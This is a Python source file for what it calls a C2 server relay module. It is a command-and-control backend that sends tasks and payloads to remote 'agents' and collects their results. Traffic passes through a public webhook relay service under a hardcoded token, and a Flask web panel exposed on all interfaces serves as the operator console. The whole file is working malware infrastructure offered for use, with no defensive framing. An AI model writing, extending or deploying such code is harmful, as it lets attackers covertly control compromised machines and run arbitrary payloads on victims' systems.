#!/usr/bin/env python3
"""
C2 Server Relay Module - Webhook.site Integration
Communicates with agents via webhook.site relay
"""
import requests
import time
import json
from flask import Flask, jsonify, request

RELAY_HOST = "api.webhook.site"
RELAY_BASE = f"https://{RELAY_HOST}/token"
TOKEN = "c2-relay-2409"

class RelayC2:
    def __init__(self, token=None):
        self.token = token or TOKEN
        self.agents = {}
        self.pending_tasks = {}
        
    def relay_get(self, endpoint):
        """GET from relay"""
        try:
            url = f"{RELAY_BASE}/{self.token}/{endpoint}"
            r = requests.get(url, timeout=30)
            return r.json() if r.status_code == 200 else None
        except Exception as e:
            print(f"[RELAY] GET fail: {e}")
            return None
    
    def relay_post(self, endpoint, data):
        """POST to relay"""
        try:
            url = f"{RELAY_BASE}/{self.token}/{endpoint}"
            r = requests.post(url, json=data, timeout=30)
            return r.status_code == 200
        except Exception as e:
            print(f"[RELAY] POST fail: {e}")
            return False
    
    def get_agents(self):
        """Get registered agents from relay"""
        agents = self.relay_get("agents")
        return agents or {}
    
    def send_task(self, agent_id, payload):
        """Send task to agent via relay"""
        task = {
            "id": f"task-{int(time.time())}",
            "payload": payload,
            "ts": time.time()
        }
        if agent_id not in self.pending_tasks:
            self.pending_tasks[agent_id] = []
        self.pending_tasks[agent_id].append(task)
        # Store in relay for agent to poll
        return self.relay_post(f"tasks/{agent_id}", self.pending_tasks[agent_id])
    
    def get_results(self, agent_id):
        """Get results from agent via relay"""
        return self.relay_get(f"results/{agent_id}")

# Flask app for web interface
def create_relay_app(server_instance):
    app = Flask(__name__)
    relay = RelayC2()
    
    @app.route('/api/relay/agents')
    def list_agents():
        return jsonify(relay.get_agents())
    
    @app.route('/api/relay/task', methods=['POST'])
    def send_task():
        data = request.get_json()
        agent_id = data.get('agent_id')
        payload = data.get('payload')
        if relay.send_task(agent_id, payload):
            return jsonify({"status": "ok"})
        return jsonify({"error": "failed"}), 500
    
    @app.route('/api/relay/results/<agent_id>')
    def get_results(agent_id):
        return jsonify(relay.get_results(agent_id) or [])
    
    return app

if __name__ == '__main__':
    app = create_relay_app(None)
    app.run(host='0.0.0.0', port=5001)
